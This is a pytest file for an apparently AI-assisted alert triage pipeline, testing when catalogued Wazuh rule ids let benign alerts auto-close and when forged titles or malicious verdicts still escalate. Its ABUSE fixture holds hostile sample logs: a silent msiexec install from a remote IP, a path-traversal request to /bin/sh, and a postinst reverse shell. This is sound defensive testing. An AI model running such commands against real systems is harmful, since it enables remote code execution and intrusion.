"""The noise catalogue (FIX-2, decision policy v2.1): a catalogued vendor rule id lifts only ``unmapped``.

Alerts are built the way the workflow sees them: a Wazuh event through the
real normalizer, with the stored raw event added and the state size cap
applied (:func:`lg_sotf.core.graph.cap_alert`).
"""

from __future__ import annotations

import copy
import json
from datetime import UTC, datetime
from typing import Any, Dict, Optional

import pytest

from lg_sotf.core.graph import cap_alert
from lg_sotf.domain import closure, routing
from lg_sotf.domain.closure import MODEL_CLOSED, UNMAPPED, model_close_blockers, model_close_class, never_close_class
from lg_sotf.domain.noise_families import (
    CATALOGUE,
    CATALOGUE_VERSION,
    WAZUH,
    DetectionRule,
    detection_rule,
    noise_family,
)
from lg_sotf.domain.routing import RoutingThresholds
from lg_sotf.ingestion.normalizers import get_normalizer
from lg_sotf.ingestion.normalizers.base import NormalizeContext

T = RoutingThresholds()
AUTO = "auto_full_audit"
CTX = NormalizeContext(source_id="wazuh-push", source_type="webhook", now=datetime(2026, 11, 9, tzinfo=UTC))
DPKG = "New dpkg (Debian Package) installed."


def wazuh_event(rule_id: Any, description: str, *, level: int = 7, mitre: Optional[Dict[str, Any]] = None,
                full_log: str = "2026-11-09 10:00:00 status installed htop:amd64 3.3.0-4") -> Dict[str, Any]:
    rule: Dict[str, Any] = {"id": rule_id, "level": level, "description": description, "groups": ["syslog", "dpkg"]}
    if mitre is not None:
        rule["mitre"] = mitre
    return {"timestamp": "2026-11-09T10:00:00.000+0000", "id": "1792751768.1", "rule": rule,
            "agent": {"id": "004", "name": "web-01", "ip": "10.20.2.61"}, "manager": {"name": "wazuh-manager"},
            "decoder": {"name": "dpkg-decoder"}, "full_log": full_log, "location": "/var/log/dpkg.log"}


def state_alert(event: Dict[str, Any]) -> Dict[str, Any]:
    """What ``initial_state`` puts in the workflow state: the canonical alert, its raw event, size-capped."""
    canonical = json.loads(get_normalizer("wazuh").normalize(event, CTX).model_dump_json())
    canonical["raw"] = copy.deepcopy(event)
    return cap_alert(canonical)


def wazuh_state(event: Dict[str, Any], **changes: Any) -> Dict[str, Any]:
    """Both model tiers benign within the thresholds, no rule evidence, no related alert (the closing case)."""
    alert = state_alert(event)
    state: Dict[str, Any] = {
        "severity": alert["severity"],
        "confidence": 25,
        "alert": alert,
        "triage": {"confidence": 25, "rule_fp": [], "rule_tp": [], "llm_used": True, "threat_assessment": "benign",
                   "threat_likelihood": 3},
        "correlation": {"related_count": 0, "related_complete": True, "related_dispositions": {}},
        "analysis": {"threat_score": 8, "certainty": 92, "verdict": "benign", "rule_threat_score": 40,
                     "rule_evidence": [], "rule_corroborated": False, "llm_used": True},
    }
    for path, value in changes.items():
        *parents, leaf = path.split(".")
        target = state
        for key in parents:
            target = target[key]
        target[leaf] = value
    return state


# --------------------------------------------------------------------------- the catalogue itself


def test_every_entry_records_its_family_rationale_and_the_abuse_it_could_hide() -> None:
    assert CATALOGUE_VERSION and CATALOGUE
    seen: Dict[str, str] = {}
    for entry in CATALOGUE:
        assert entry.vendor == WAZUH and entry.family and entry.rule_ids, entry
        assert len(entry.rationale) > 60 and len(entry.could_hide) > 10, entry.family
        assert entry.abuse_known is not entry.could_hide.lower().startswith("none known"), entry.family
        for rule_id in entry.rule_ids:
            assert rule_id.isdigit() and rule_id not in seen, (rule_id, entry.family)
            seen[rule_id] = entry.family
    assert {e.family for e in CATALOGUE if e.abuse_known} >= {"linux_package_install", "windows_software_install"}


@pytest.mark.parametrize(
    ("rule_id", "description", "family"),
    [
        ("2902", DPKG, "linux_package_install"),
        ("2933", "Yum package updated.", "linux_package_install"),
        ("60612", "Application installed Product: 7-Zip 24.08 (x64 edition) -- Installation completed.",
         "windows_software_install"),
        ("62130", "Windows Defender: Antimalware definitions updated successfully", "antivirus_status"),
        ("31101", "Web server 400 error code.", "web_client_error"),
    ],
)
def test_a_catalogued_rule_id_lifts_the_unmapped_class_and_closes_on_both_tiers(
    rule_id: str, description: str, family: str
) -> None:
    state = wazuh_state(wazuh_event(rule_id, description))
    assert never_close_class(state["alert"]) == UNMAPPED
    assert detection_rule(state["alert"]) == DetectionRule(WAZUH, rule_id)
    assert closure.catalogued_noise(state["alert"]).family == family  # type: ignore[union-attr]
    assert model_close_class(state["alert"]) is None
    decision = routing.decide(state, T, AUTO)
    assert (decision.route, decision.code) == ("close", MODEL_CLOSED)
    assert f"catalogued noise {family}, catalogue {CATALOGUE_VERSION}" in decision.reason
    assert routing.decide(state, T, "off").route == "escalate"


def test_the_catalogue_lifts_only_unmapped_never_a_mapped_never_close_class() -> None:
    for mitre, found in (({"tactic": ["Credential Access"], "id": ["T1110"]}, "credential_access"),
                         ({"tactic": ["Defense Evasion"], "id": ["T1562.001"]}, "tampering"),
                         ({"tactic": ["Persistence"], "id": ["T1543.002"]}, "named_persistence")):
        state = wazuh_state(wazuh_event("2902", DPKG, mitre=mitre))
        assert noise_family(state["alert"]) is not None  # the rule is catalogued ...
        assert closure.catalogued_noise(state["alert"]) is None  # ... but it is not unmapped
        assert model_close_class(state["alert"]) == found
        assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == ["never_close_class"]
    mapped = wazuh_state(wazuh_event("2902", DPKG, mitre={"tactic": ["Execution"], "id": ["T1072"]}))
    assert routing.decide(mapped, T, AUTO).reason == "AI-closed, audit required: both model tiers judged it benign"


# --------------------------------------------------------------------------- rule id only, never text


@pytest.mark.parametrize(
    ("rule_id", "description"),
    [
        ("100200", DPKG),  # a custom (local) rule copying a stock description word for word
        ("100201", "2902: New dpkg (Debian Package) installed."),  # the description forges the rule-name prefix
        ("554", "File added to the system."),  # a dropped file is not package noise
        ("2903", "Dpkg (Debian Package) removed."),  # removing a security agent is defense impairment
        ("2934", "Yum package deleted."),
        ("31120", "Web server 500 error code (server error)."),  # a server error can be an exploit's side effect
        ("61104", "Service startup type was changed"),
        ("80792", "Audit: Command: /usr/bin/dpkg."),
    ],
)
def test_a_forged_or_borrowed_title_on_an_uncatalogued_rule_stays_unmapped(rule_id: str, description: str) -> None:
    event = wazuh_event(rule_id, description, full_log="New dpkg (Debian Package) installed. rule 2902 62130 31101")
    state = wazuh_state(event, **{"alert.title": DPKG, "alert.description": "2902: " + DPKG})
    assert noise_family(state["alert"]) is None
    assert model_close_class(state["alert"]) == UNMAPPED
    assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == ["never_close_class"]
    assert routing.decide(state, T, AUTO).route == "escalate"


def test_the_rule_id_comes_from_the_vendor_event_and_the_wazuh_rule_name_only() -> None:
    alert = state_alert(wazuh_event("2902", DPKG))
    assert alert["rule_name"] == f"2902: {DPKG}" and detection_rule(alert) == DetectionRule(WAZUH, "2902")
    assert detection_rule({**alert, "raw": {**alert["raw"], "rule": {**alert["raw"]["rule"], "id": 2902}}}) is not None
    forged_name = {**alert, "raw": {**alert["raw"], "rule": {**alert["raw"]["rule"], "id": "100200"}}}
    assert detection_rule(forged_name) is None  # rule_name says 2902, the vendor event says 100200
    for broken in (
        {**alert, "rule_name": DPKG},  # no Wazuh rule-name prefix: not built by the Wazuh normalizer
        {**alert, "rule_name": None},
        {**alert, "rule_name": "29021: x"},
        {k: v for k, v in alert.items() if k != "raw"},  # raw dropped (state size cap): unknown
        {**alert, "raw": {"_omitted": "raw event too large for workflow state"}},
        {**alert, "raw": {"rule": "2902"}},
        {**alert, "raw": {"rule": {"id": True}}},
        {**alert, "raw": {"rule": {"id": ["2902"]}}},
        {**alert, "raw": {"rule": {"id": "2902a"}}},
        {**alert, "raw": {"rule": {"id": ""}}},
        {**alert, "raw": {"rule": {"id": "29" * 8}}},
        None, [], "2902",
    ):
        assert detection_rule(broken) is None, broken
        assert noise_family(broken) is None
        assert model_close_class(broken) == UNMAPPED
    # A title, description or rule name alone is never a rule id (a canonical alert without a vendor event).
    canonical = {"title": DPKG, "description": DPKG, "rule_name": f"2902: {DPKG}", "mitre": {}, "raw": {}}
    assert noise_family(canonical) is None and model_close_class(canonical) == UNMAPPED


def test_an_oversized_raw_event_is_dropped_by_the_state_cap_and_fails_closed() -> None:
    event = {**wazuh_event("2902", DPKG), "data": {f"field{i}": "x" * 1_500 for i in range(30)}}
    alert = state_alert(event)
    assert "rule" not in alert["raw"]
    assert model_close_class(alert) == UNMAPPED


# --------------------------------------------------------------------------- every other condition still applies


@pytest.mark.parametrize(
    ("change", "blocker"),
    [
        ({"severity": "high"}, "severity"),
        ({"severity": "critical"}, "severity"),
        ({"triage.rule_tp": ["prompt_injection_suspected"]}, "steering_text"),
        ({"analysis.rule_evidence": ["prior_malicious_history"]}, "recent_true_positive"),
        ({"analysis.rule_corroborated": True}, "recent_true_positive"),
        ({"correlation.related_dispositions": {"malicious": 1}}, "recent_true_positive"),
        ({"correlation": {"related_count": 2, "related_dispositions": {}}}, "campaign_in_progress"),
        ({"triage.threat_likelihood": 9}, "fast_tier_not_benign"),
        ({"triage.threat_assessment": "suspicious"}, "fast_tier_not_benign"),
        ({"triage.llm_used": False}, "fast_tier_not_benign"),
        ({"analysis.certainty": 84}, "deep_tier_not_benign"),
        ({"analysis.verdict": "inconclusive"}, "deep_tier_not_benign"),
    ],
)
def test_every_other_condition_still_blocks_a_catalogued_rule(change: Dict[str, Any], blocker: str) -> None:
    state = wazuh_state(wazuh_event("2902", DPKG), **change)
    assert model_close_blockers(state, tier=AUTO, max_likelihood=8, min_certainty=85) == [blocker]
    assert routing.decide(state, T, AUTO).route != "close"
    assert model_close_blockers(state, tier="off", max_likelihood=8, min_certainty=85)[0] == "tier_off"


def test_a_high_level_catalogued_rule_never_closes_on_the_models_word() -> None:
    state = wazuh_state(wazuh_event("2902", DPKG, level=12))
    assert state["severity"] == "high"
    assert routing.decide(state, T, AUTO).route == "escalate"


# --------------------------------------------------------------------------- the abuse each family could hide

ABUSE = [
    ("2902", DPKG, "status installed sysupdate-helper:amd64 1.0 (postinst opens a reverse shell)"),
    ("2932", "New Yum package installed.", "Installed: kernel-tools-helper-0.1-1.x86_64 (unsigned, from /tmp)"),
    ("60612", "Application installed Product: AnyDesk -- Installation completed successfully.",
     "MsiInstaller: msiexec /q /i http://203.0.113.9/a.msi"),
    ("31101", "Web server 400 error code.", "GET /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1 400"),
]
MALICIOUS_VERDICTS = [
    # The deep tier says malicious, the fast tier a likely threat.
    {"triage.threat_assessment": "likely_threat", "triage.threat_likelihood": 85, "analysis.verdict": "malicious",
     "analysis.threat_score": 90, "analysis.certainty": 90},
    # The deep tier says malicious at a low threat score.
    {"analysis.verdict": "malicious", "analysis.threat_score": 20, "analysis.certainty": 70},
    # Only the fast tier is suspicious; the deep tier was persuaded.
    {"triage.threat_assessment": "suspicious", "triage.threat_likelihood": 40},
    # The deep tier cannot tell.
    {"analysis.verdict": "inconclusive", "analysis.threat_score": 50, "analysis.certainty": 40},
]


@pytest.mark.parametrize(("rule_id", "description", "log"), ABUSE)
@pytest.mark.parametrize("verdict", MALICIOUS_VERDICTS)
def test_a_malicious_or_suspicious_model_verdict_on_a_catalogued_rule_still_escalates(
    rule_id: str, description: str, log: str, verdict: Dict[str, Any]
) -> None:
    """Malicious package install, software install as execution, web probing: the catalogue never decides the
    verdict, so a model that sees the abuse sends it to a person (an analyst or a response plan) at every tier."""
    state = wazuh_state(wazuh_event(rule_id, description, full_log=log), **verdict)
    assert closure.catalogued_noise(state["alert"]) is not None
    for tier in ("off", AUTO):
        decision = routing.decide(state, T, tier)
        assert decision.route in ("escalate", "plan_response") and decision.disposition != "benign", (tier, decision)
